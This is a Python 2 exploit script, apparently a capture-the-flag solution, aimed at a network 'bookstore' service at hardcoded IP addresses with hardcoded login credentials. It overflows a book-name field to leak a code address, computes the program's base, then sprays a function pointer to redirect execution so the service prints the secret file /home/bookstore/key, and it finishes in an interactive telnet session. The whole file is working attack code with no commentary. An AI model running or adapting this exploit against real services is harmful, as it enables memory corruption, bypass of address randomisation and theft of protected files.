import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def read_menu():
    readuntil(f, '> ')

def add_ebooks(name, des, t, download):
    f.write('1\n')
    readuntil(f, 'Bookname : \n')
    f.write(name + '\n')
    readuntil(f, 'Description : \n')
    f.write(des + '\n')
    readuntil(f, 'EBook)\n')
    f.write(t + '\n')
    readuntil(f, 'Download : \n')
    f.write(download + '\n')
    readuntil(f, 'Complete')

def add_books(name, des, t):
    f.write('1\n')
    readuntil(f, 'Bookname : \n')
    f.write(name + '\n')
    readuntil(f, 'Description : \n')
    f.write(des + '\n')
    readuntil(f, 'EBook)\n')
    f.write(t + '\n')
    readuntil(f, 'Complete')

host = '200.200.200.5'#'202.120.7.107'#'54.65.210.251'#'202.120.7.107'
port = 1337#31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, 'Your ID : ')
f.write('helloadmin')
readuntil(f, 'Your PASSWORD : ')
f.write('iulover!@#$')

raw_input('wait1')

add_books('B', 'A', '0')
f.write('2\n')
readuntil(f, 'No : ')
f.write('0\n')
readuntil(f, 'menu!\n')
f.write('3\n')
readuntil(f, 'Stock : \n')
f.write('16843009\n')
readuntil(f, 'Price : \n')
f.write('16843009\n')
readuntil(f, '0 : not) \n')
f.write('1\n')
readuntil(f, 'Avaliable :\n')
f.write('1\n')
readuntil(f, 'bookname\n')
f.write('1\n')
readuntil(f, 'description\n')
f.write('1\n')
readuntil(f, 'menu!\n')
f.write('1\n')
readuntil(f, 'bookname\n')
f.write('A' * 400 + '\n')
readuntil(f, 'menu!\n')
f.write('0\n')

read_menu()
f.write('3\n')
readuntil(f, 'No : ')
f.write('0\n')
readuntil(f, 'name : \'')
des = readuntil(f, '\'.')
func_9ad =  up(des[20 + 8:20 + 8 + 4])
code_base = func_9ad - 0x9ad
print 'code_base: %s' % hex(code_base)
print_file = code_base + 0x8db

raw_input('bf9')
add_books('B', 'A', '0')

key_path = '/home/bookstore/key'
read_menu()
f.write('2\n')
readuntil(f, 'No : ')
f.write('1\n')
readuntil(f, 'menu!\n')
f.write('2\n')
readuntil(f, 'description\n')
time.sleep(1)
#print (p(print_file) * 0x4).encode('hex')
f.write(p(print_file) * (0xBB0 / 4) + '\n')
raw_input('wait')
readuntil(f, 'menu!\n')
f.write('3\n')
#time.sleep(1)

readuntil(f, 'Stock : \n')
f.write('16843009\n')
readuntil(f, 'Price : \n')
f.write('16843009\n')
readuntil(f, '0 : not) \n')
f.write('0\n')
readuntil(f, 'Avaliable :\n')
f.write('1\n')
readuntil(f, 'bookname\n')
f.write('/home/bookstore/key\x00' + 'A' * (0x1f0 - len(key_path) - 1) + '\n')
raw_input('wait')
readuntil(f, 'description\n')
f.write('A'  + '\n')
readuntil(f, 'menu!\n')
f.write('0\n')

read_menu()
f.write('2\n')
readuntil(f, 'No : ')
f.write('1\n')
readuntil(f, 'menu!\n')
f.write('4\n')
readuntil(f, 'shipping)\n')
f.write('1\n')
readuntil(f, 'menu!\n')
f.write('0\n')

raw_input('wait')

t = telnetlib.Telnet()
t.sock = s
t.interact()
